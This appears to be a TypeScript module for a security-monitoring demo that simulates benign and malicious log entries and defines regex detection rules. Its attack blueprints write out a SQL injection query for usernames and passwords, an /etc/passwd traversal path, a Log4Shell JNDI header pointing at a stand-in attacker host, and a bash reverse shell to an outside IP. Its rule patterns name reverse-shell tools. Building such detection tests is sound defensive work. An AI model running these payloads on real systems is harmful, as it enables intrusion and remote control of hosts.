import { LogEntry, ThreatRule, AlertEntry, SeverityType } from "./types";

// Random IP generator helper
export function generateRandomIp(): string {
  const isSuspicious = Math.random() < 0.25;
  if (isSuspicious) {
    const attackers = ["198.51.100.42", "203.0.113.88", "192.0.2.145", "185.220.101.5"];
    return attackers[Math.floor(Math.random() * attackers.length)];
  }
  return `192.168.1.${Math.floor(Math.random() * 220) + 10}`;
}

// Simple Shannon entropy calculator to model ML core anomaly sizing
export function calculateEntropy(str: string): number {
  if (!str) return 0;
  const len = str.length;
  const freq: Record<string, number> = {};
  for (let i = 0; i < len; i++) {
    const char = str[i];
    freq[char] = (freq[char] || 0) + 1;
  }
  let entropy = 0;
  for (const char in freq) {
    const p = freq[char] / len;
    entropy -= p * Math.log2(p);
  }
  return parseFloat(entropy.toFixed(3));
}

// Initial set of security signature rules
export const INITIAL_RULES: ThreatRule[] = [
  {
    id: "rule_sql_inject",
    ruleName: "SQL_Injection_Attack_Attempt",
    severity: "High",
    category: "SQL Injection",
    description: "Detects classic SQL database injection syntax payloads, e.g. UNION SELECT, OR 1=1 structures.",
    pattern: "(union\\s+select|select\\s+.*\\s+from|or\\s+1\\s*=\\s*1|drop\\s+table|insert\\s+into)",
    targetField: "urlPath",
    isEnabled: true,
    engineType: "Signature",
    matchedTimes: 0,
    recommendedMitigation: "Enforce strictly prepared statements in ORM SQL queries; deploy Web Application Firewall (WAF) rule sets."
  },
  {
    id: "rule_path_trav",
    ruleName: "Directory_Traversal_Access",
    severity: "High",
    category: "Exfiltration Path",
    description: "Detects attempts to climb container directory trees to access protected system assets.",
    pattern: "(\\.\\.\\/\\.\\.|\\.\\.%2e|/etc/passwd|/etc/shadow|/boot\\.ini|win\\.ini)",
    targetField: "urlPath",
    isEnabled: true,
    engineType: "Signature",
    matchedTimes: 0,
    recommendedMitigation: "Sanitize directory parsing endpoints. Avoid direct string concat for system IO; load node context within jailed boundaries."
  },
  {
    id: "rule_reverse_shell",
    ruleName: "Unauthorized_Reverse_Shell_Spawn",
    severity: "Critical",
    category: "Remote Code Execution",
    description: "Detects execution of Unix core interactive bash channels redirected to remote external ports.",
    pattern: "(/bin/bash\\s+-i|nc\\s+-e\\s+/|/bin/sh|python\\s+-c\\s+['\"].*import\\s+socket|perl\\s+-e\\s+['\"].*socket)",
    targetField: "command",
    isEnabled: true,
    engineType: "Signature",
    matchedTimes: 0,
    recommendedMitigation: "Immediately terminate running container PID; audit and lock incoming process permissions; trigger complete pod redeployment."
  },
  {
    id: "rule_brute_force",
    ruleName: "Failed_SSHD_Auth_Burst",
    severity: "Medium",
    category: "Brute Force Intrusion",
    description: "Monitors login failures on core authentication endpoints which signify dictionary probing.",
    pattern: "(failed\\s+password|authentication\\s+failed|invalid\\s+user|permission\\s+denied)",
    targetField: "payload",
    isEnabled: true,
    engineType: "Signature",
    matchedTimes: 0,
    recommendedMitigation: "Activate fail2ban rate boundary blocks, deactivate raw password Auth and enforce secure SSH public key certificates."
  },
  {
    id: "rule_log4j",
    ruleName: "CVE_Log4j_JNDI_Exploit",
    severity: "Critical",
    category: "Remote Injection",
    description: "Detects malicious Log4j JNDI lookup payloads attempting to trigger remote JNDI Java resource downloads.",
    pattern: "(\\$\\{jndi:(ldap|rmi|ldaps|dns|http):)",
    targetField: "headers",
    isEnabled: true,
    engineType: "Signature",
    matchedTimes: 0,
    recommendedMitigation: "Update target JVM runtime parameters to log4j2.formatMsgNoLookups=true; rebuild target image with patched log4j library versions."
  }
];

// Benign log templates
const BENIGN_URLS = [
  "/api/products/get?id=12",
  "/static/css/main.chunk.css",
  "/api/auth/profile",
  "/api/cart/items",
  "/index.html",
  "/favicon.ico",
  "/api/analytics/dash?range=30d",
  "/v2/user/settings",
  "/images/banner_marketing.jpg",
  "/api/system/health"
];

const BENIGN_USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
  "PostmanRuntime/7.36.0",
  "curl/8.4.0"
];

const BENIGN_USERNAMES = ["admin", "developer", "guest", "keerthana", "security_guy", "system_daemon_v2"];

// Generate a random legimate log
export function generateBenignLog(topic?: "auth-topic" | "web-access-topic" | "syslog-topic"): LogEntry {
  const chosenTopic = topic || (["auth-topic", "web-access-topic", "syslog-topic"][Math.floor(Math.random() * 3)] as any);
  const id = `log_${Math.random().toString(36).substring(2, 11)}`;
  const timestamp = new Date().toISOString();
  const sourceIp = generateRandomIp();

  let method = "GET";
  let urlPath = "";
  let payload = "";
  let headers = `{"Host":"internal-api-service","User-Agent":"${BENIGN_USER_AGENTS[Math.floor(Math.random() * BENIGN_USER_AGENTS.length)]}"}`;
  let command = "";
  let username = "";
  let targetPort = 80;
  let statusCode = 200;

  if (chosenTopic === "web-access-topic") {
    method = Math.random() < 0.2 ? "POST" : "GET";
    urlPath = BENIGN_URLS[Math.floor(Math.random() * BENIGN_URLS.length)];
    targetPort = 443;
    if (method === "POST") {
      payload = `{"action":"fetch","timestamp":${Date.now()},"client_ver":"1.4.2"}`;
      statusCode = 201;
    }
  } else if (chosenTopic === "auth-topic") {
    method = "POST";
    urlPath = "/api/v1/login";
    targetPort = 8080;
    username = BENIGN_USERNAMES[Math.floor(Math.random() * BENIGN_USERNAMES.length)];
    const isSuccess = Math.random() < 0.95;
    statusCode = isSuccess ? 200 : 401;
    payload = `{"username":"${username}","status":"${isSuccess ? "AUTH_SUCCESS" : "AUTH_FAIL"}"}`;
  } else {
    // syslog-topic
    method = "SYSTEM";
    targetPort = 22;
    const sysLogs = [
      "sshd: Connection closed by authenticating user",
      "dockerd: Container health check reports OK: pod-api-backend-8bf21",
      "systemd[1]: Started Web service API daemon container instance.",
      "redis: DB 0: 4831 keys in active search index, memory in limits",
      "k8s-kubelet: Pod lifecycle transition of replica-v3 completed."
    ];
    payload = sysLogs[Math.floor(Math.random() * sysLogs.length)];
    statusCode = 100;
  }

  return {
    id,
    timestamp,
    sourceIp,
    targetPort,
    method,
    urlPath,
    headers,
    payload,
    command,
    username,
    statusCode,
    severity: "Low",
    topic: chosenTopic,
    entropy: calculateEntropy(payload || urlPath || "")
  };
}

// Malicious log blueprints
export const ATTACK_BLUEPRINTS = [
  {
    name: "SQL Injection Probing",
    topic: "web-access-topic",
    method: "GET",
    urlPath: "/api/users/profile?id=5%20UNION%20SELECT%20null,username,password%20FROM%20users",
    payload: "",
    targetPort: 443,
    headers: '{"User-Agent":"Mozilla SQLmap Scanner Tool v1.5"}',
    severity: "High" as SeverityType,
    triggerField: "urlPath"
  },
  {
    name: "Directory Traversal Attack",
    topic: "web-access-topic",
    method: "GET",
    urlPath: "/static/../../etc/passwd",
    payload: "",
    targetPort: 443,
    headers: '{"User-Agent":"Mozilla Libcurl vulnerability scanner"}',
    severity: "High" as SeverityType,
    triggerField: "urlPath"
  },
  {
    name: "Log4Shell Exploitation",
    topic: "web-access-topic",
    method: "POST",
    urlPath: "/api/auth/callback",
    payload: '{"username":"keerthana","token":"raw"}',
    targetPort: 443,
    headers: '{"X-Api-Version":"${jndi:ldap://attacker.c2.server:1389/Exploit}","User-Agent":"JNDI-Probe-Client"}',
    severity: "Critical" as SeverityType,
    triggerField: "headers"
  },
  {
    name: "SSH Unauthorized Brute Force Fail",
    topic: "auth-topic",
    method: "SSH-CONN",
    urlPath: "",
    username: "administrator",
    payload: "sshd[10432]: failed password for invalid user administrator from attacker_ip port 55673 ssh2",
    targetPort: 22,
    severity: "Medium" as SeverityType,
    triggerField: "payload"
  },
  {
    name: "Terminal Shell Execution Escalation",
    topic: "syslog-topic",
    method: "SHELL-EXEC",
    urlPath: "",
    command: "/bin/bash -i >& /dev/tcp/91.241.12.87/4444 0>&1",
    payload: "kernel: [Audit Alert] Executed reverse socket proxy sequence.",
    targetPort: 22,
    severity: "Critical" as SeverityType,
    triggerField: "command"
  },
  {
    name: "ML Entropy Outlier Attack",
    topic: "web-access-topic",
    method: "POST",
    urlPath: "/api/upload/config",
    payload: "f83b1a779cd29ae119b456fef31828a2b5371c1bbccaef678deec3ad12921a20ee428ba10eeeb5c17d7b5b044dfef090de3818e8dce9bef091ad", // Raw high entropy, no spaces
    targetPort: 443,
    headers: '{"Content-Type":"application/octet-stream"}',
    severity: "High" as SeverityType,
    triggerField: "payload"
  }
];

export function generateAttackLog(typeIdx?: number): LogEntry {
  const chosenIdx = typeIdx !== undefined ? typeIdx : Math.floor(Math.random() * ATTACK_BLUEPRINTS.length);
  const blueprint = ATTACK_BLUEPRINTS[chosenIdx];
  const id = `log_attack_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
  const timestamp = new Date().toISOString();
  const attackerIps = ["198.51.100.42", "203.0.113.88", "192.0.2.145", "185.220.101.5", "112.54.12.9"];
  const sourceIp = attackerIps[Math.floor(Math.random() * attackerIps.length)];

  return {
    id,
    timestamp,
    sourceIp,
    targetPort: blueprint.targetPort,
    method: blueprint.method,
    urlPath: blueprint.urlPath || undefined,
    headers: blueprint.headers || undefined,
    payload: blueprint.payload || undefined,
    command: blueprint.command || undefined,
    username: blueprint.username || undefined,
    statusCode: blueprint.topic === "auth-topic" ? 401 : blueprint.topic === "syslog-topic" ? 500 : 403,
    severity: blueprint.severity,
    topic: blueprint.topic as any,
    entropy: calculateEntropy(blueprint.payload || blueprint.urlPath || blueprint.command || "")
  };
}
